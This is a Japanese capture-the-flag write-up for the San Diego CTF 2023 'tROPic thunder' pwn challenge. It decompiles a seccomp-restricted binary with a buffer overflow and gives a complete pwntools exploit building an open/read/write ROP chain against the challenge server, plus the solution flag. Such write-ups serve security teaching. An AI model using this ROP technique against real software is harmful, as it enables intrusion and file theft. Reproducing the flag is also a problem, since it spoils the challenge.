# San Diego CTF 2023 `tROPic thunder [pwn]` writeup

## 問題
I hope this isn't your first rodeo

Connect via: `nc thunder.sdc.tf 1337`

Dockerfileと実行バイナリが配布される。

## 解法
ghidraに食わせたらこんな感じ。

```c
undefined8 main(){
  char buf [112];
  
  setbuf((FILE *)stdin,(char *)0x0);
  setbuf((FILE *)stdout,(char *)0x0);
  setbuf((FILE *)stderr,(char *)0x0);
  setup_seccomp();
  puts("you\'ll really be in the jungle with this one!");
  fgets(buf,0x200,(FILE *)stdin);
  return 0;
}
```

非常にシンプルなROP問。
ただし`setup_seccomp()`でexecvシステムコールが禁止されている。

シェルを起動せずにopen, read, writeでflag.txtを読み出すことにする。
(フラグの書かれたファイル名はDockerfileを見たら分かる)

「read, write系の関数はともかく`open()`はないじゃん」と思っていたが、なんとstatic linkだった。`syscall; ret`みたいなガジェットまでバイナリにある。

ここで真面目にROPすればいいのに、mprotectシステムコールで.bssセクションをexecutableにしてシェルコードを流すことを企てる。
こっちの方が楽そうだ。

しかしexoploitコードが機能しない。
しかたなく動的解析すると、`pop rax`でRAXレジスタに0xaをセットするところでROP chainの読み込みが途切れていた。

**`fgets()`は改行(\x0a)で止まります。**

急がば回れ、gadgetも豊富にあるのでopen -> read -> writeを順にROPで実行することに。

## Exploit

```py
from pwn import *
import sys

elf = ELF("tROPic-thunder")

# io = process(elf.path)
io = remote('thunder.sdc.tf', 1337)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io, gdbscript='b *0x484105')

pop_rdi_ret = next(elf.search(asm('pop rdi ; ret'), executable=True))
pop_rsi_ret = next(elf.search(asm('pop rsi ; ret'), executable=True))
pop_rdx_ret = next(elf.search(asm('pop rdx ; ret'), executable=True))
pop_rax_ret = next(elf.search(asm('pop rax ; ret'), executable=True))
syscall = next(elf.search(asm('syscall ; ret'), executable=True))
flag_addr = elf.bss() + 0x200

p = b'A' * 0x78

# read(0, addr, 0x200)
p += p64(pop_rdi_ret)
p += p64(0)
p += p64(pop_rsi_ret)
p += p64(flag_addr)
p += p64(pop_rdx_ret)
p += p64(0x200)
p += p64(pop_rax_ret)
p += p64(0)
p += p64(syscall)

# open(addr, 0, 0)
p += p64(pop_rdi_ret)
p += p64(flag_addr)
p += p64(pop_rsi_ret)
p += p64(0)
p += p64(pop_rdx_ret)
p += p64(0)
p += p64(pop_rax_ret)
p += p64(2)
p += p64(syscall)

# read(3, addr, 0x200)
p += p64(pop_rdi_ret)
p += p64(3)
p += p64(pop_rsi_ret)
p += p64(flag_addr + 0x200)
p += p64(pop_rdx_ret)
p += p64(0x200)
p += p64(pop_rax_ret)
p += p64(0)
p += p64(syscall)

# write(1, addr, 0x200)
p += p64(pop_rdi_ret)
p += p64(1)
p += p64(pop_rsi_ret)
p += p64(flag_addr + 0x200)
p += p64(pop_rdx_ret)
p += p64(0x200)
p += p64(pop_rax_ret)
p += p64(1)
p += p64(syscall)

print(f'payload len: {hex(len(p))}')

io.sendlineafter(b'one!\n', p)

io.sendline(b'flag.txt\x00')

io.interactive()
```

FLAG: `sdctf{I_w4tch3d_tR0p1c_7huNd3r_wh1l3_m4k1nG_7h1s_ch4al13ng3}`